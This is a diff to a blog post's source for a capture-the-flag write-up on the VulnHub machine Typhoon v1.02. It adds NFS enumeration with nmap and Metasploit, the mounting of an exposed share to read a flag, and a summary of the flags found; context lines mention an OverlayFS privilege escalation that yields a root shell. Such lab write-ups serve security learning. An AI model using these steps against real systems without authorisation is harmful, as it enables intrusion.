@@ -8,18 +8,18 @@ header:
   image:    assets/images/2019-02-13-typhoon-v102-writeup/header.jpg
   teaser:   assets/images/2019-02-13-typhoon-v102-writeup/header.jpg
   caption:  "Photo credit: [**Unsplash**](https://unsplash.com)"
-published: false
 ---
 
 This is a writeup for the [Typhoon v1.02 machine on VulnHub](https://www.vulnhub.com/entry/typhoon-102,267/).
-This is a highly vulnerable machine, with multiple potential entry points.
+This is a highly vulnerable machine, with multiple potential entry points. There
+are four different flags to capture.
 
 ## Step 1: Scanning
 
 ### Nmap
 
 ```
-nmap -A -T5 10.99.59.112
+$ nmap -A -T5 10.99.59.112
 Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-13 13:27 EST
 Stats: 0:00:28 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
 NSE Timing: About 99.31% done; ETC: 13:27 (0:00:00 remaining)
@@ -200,7 +200,7 @@ typhoon.local.		3600	IN	SOA	ns.prismacsi.com. enes.prismacsi.com. 1 3600 600 864
 ;; XFR size: 11 records (messages 1, bytes 338)
 ```
 
-We got a flag!
+We got a flag! 1/4 flags.
 
 ## Step 2: Breaking into the machine
 
@@ -372,6 +372,72 @@ www-data
 
 And we're in with a shell.
 
+### NFS
+
+```
+111/tcp  open  rpcbind     2-4 (RPC #100000)
+| rpcinfo: 
+|   program version   port/proto  service
+|   100000  2,3,4        111/tcp  rpcbind
+|   100000  2,3,4        111/udp  rpcbind
+|   100003  2,3,4       2049/tcp  nfs
+|   100003  2,3,4       2049/udp  nfs
+|   100005  1,2,3      34758/udp  mountd
+|   100005  1,2,3      59107/tcp  mountd
+|   100021  1,3,4      39146/tcp  nlockmgr
+|   100021  1,3,4      45519/udp  nlockmgr
+|   100024  1          50443/tcp  status
+|   100024  1          59636/udp  status
+|   100227  2,3         2049/tcp  nfs_acl
+|_  100227  2,3         2049/udp  nfs_acl
+```
+
+This indicates that the machine has an NFS server running. Let's check it out.
+
+In the Metasploit console:
+
+```
+msf5 > search nfs
+
+Matching Modules
+================
+
+   Name                                   Disclosure Date  Rank     Check  Description
+   ----                                   ---------------  ----     -----  -----------
+   [...]
+   auxiliary/scanner/nfs/nfsmount                          normal   Yes    NFS Mount Scanner
+   [...]
+msf5 > use auxiliary/scanner/nfs/nfsmount
+msf5 auxiliary(scanner/nfs/nfsmount) > set rhost 10.99.59.112
+rhost => 10.99.59.112
+msf5 auxiliary(scanner/nfs/nfsmount) > run
+
+[+] 10.99.59.112:111      - 10.99.59.112 NFS Export: /typhoon [*]
+[*] 10.99.59.112:111      - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+```
+
+The NFS server is sharing a folder at `/typhoon`. Let's mount it.
+
+```
+$ mkdir /tmp/typhoon
+$ mount -t nfs 10.99.59.112:/typhoon /tmp/typhoon
+$ cd /tmp/typhoon
+$ ls -lA
+total 12
+-rw-r--r-- 1 root root   24 Oct 22 17:50 .secret
+-rw-r--r-- 1 root root   63 Oct 24 06:58 secret
+-rw------- 1 root root 1766 Oct 22 17:51 .secret.rsa
+$ cat .secret
+belong to typhoon user.
+$ cat .secret.rsa
+cat: .secret.rsa: Permission denied
+$ cat secret
+<FLAG>
+```
+
+Another flag. 2/4 flags.
+
 ## Step 3: Privilege escalation
 
 ### OverlayFS (CVE-2015-1328)
@@ -441,6 +507,21 @@ sh: 0: can't access tty; job control turned off
 ```
 
 We now have a shell prompt with root privileges. Let's read the root flag!
+
 ```
 # cat /root/root-flag
+<FLAG>
 ```
+Last flag I have found. 3/4 flags.
+
+## Summary
+
+So far, I've only been able to find 3 out of the 4 total flags.
+
+1. DNS flag
+2. NFS flag
+3. Root flag
+
+The VM is available on [VulnHub](https://www.vulnhub.com/entry/typhoon-102,267/).
+I used VMware Fusion to run the VM. The process took me about 3-4 hours of trial
+and error.
